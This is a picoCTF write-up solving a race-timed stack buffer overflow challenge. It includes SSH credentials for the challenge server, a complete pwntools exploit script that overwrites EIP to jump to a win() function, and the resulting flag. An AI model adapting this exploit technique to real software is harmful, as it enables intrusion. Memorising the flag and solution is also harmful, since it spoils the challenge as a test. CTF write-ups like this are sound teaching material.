# PicoCTF: Binary Exploit Time Race

## Objective
The challenge requires exploiting a binary that is generated with random properties, compiled, and deleted within 120 seconds. We are provided with SSH credentials.

## Setup
We connect to the server using the provided SSH credentials: `ssh -p 56307 ctf-player@green-hill.picoctf.net` with password `83dcefb7`.
Running `./start` compiles a random C program into a binary with the same name (e.g., `9.c` -> `9`). The binary reads from standard input with a buffer overflow vulnerability and has access to `flag.txt`. A `win` function exists that prints the flag.

## Vulnerability
The `gets()` function reads input into a statically sized buffer without boundary checks. This allows us to overwrite the saved instruction pointer (EIP) on the stack, diverting execution to the `win()` function. Since the binary changes each time `./start` is run, the offset to EIP and the address of the `win` function change with every generation.

## Exploit Strategy
1. Connect via SSH using `pwntools`.
2. Run the `./start` executable to generate and compile the challenge binary.
3. Parse the output of `./start` to get the generated binary name.
4. Download the C code to extract the `BUFSIZE` or run `readelf` on the binary to find the address of the `win` function.
5. Find the precise offset to EIP by sending a cyclic pattern of bytes to the binary and reading its response (`"Jumping to 0x..."`).
6. Rerun the binary with the calculated offset, sending a payload of `[offset * 'A'] + p32(win_addr)` to overwrite EIP and jump to the `win` function.

## Exploit Script
```python
from pwn import *
import re

context.arch = 'i386'

# Establish SSH connection
s = ssh(host='green-hill.picoctf.net', user='ctf-player', port=56307, password='83dcefb7')

# Execute ./start
sh = s.process('./start')
output = sh.recvall().decode()

# Extract binary name
match = re.search(r'Compilation successful: (\d+)', output)
bin_name = match.group(1)

# Find win function address using readelf
readelf_output = s.run(f'readelf -s {bin_name} | grep win').recvall().decode()
win_addr_str = readelf_output.split()[1]
win_addr = int(win_addr_str, 16)

# Find the offset using a cyclic pattern
p = s.process(f'./{bin_name}')
p.recvuntil(b'string: \n')
p.sendline(cyclic(100))
resp = p.recvall().decode()

# Parse the fault address
jump_match = re.search(r'Jumping to (0x[0-9a-f]+)', resp)
fault_addr = int(jump_match.group(1), 16)
offset = cyclic_find(p32(fault_addr))

# Final exploitation
p2 = s.process(f'./{bin_name}')
p2.recvuntil(b'string: \n')
exploit_payload = b'A' * offset + p32(win_addr)
p2.sendline(exploit_payload)
flag_resp = p2.recvall().decode()

print(flag_resp)
```

## Result
Running the script quickly analyzes and exploits the generated binary. The output yields the flag: `picoCTF{u_Us3d_pwNt00L5_80a06240}`.
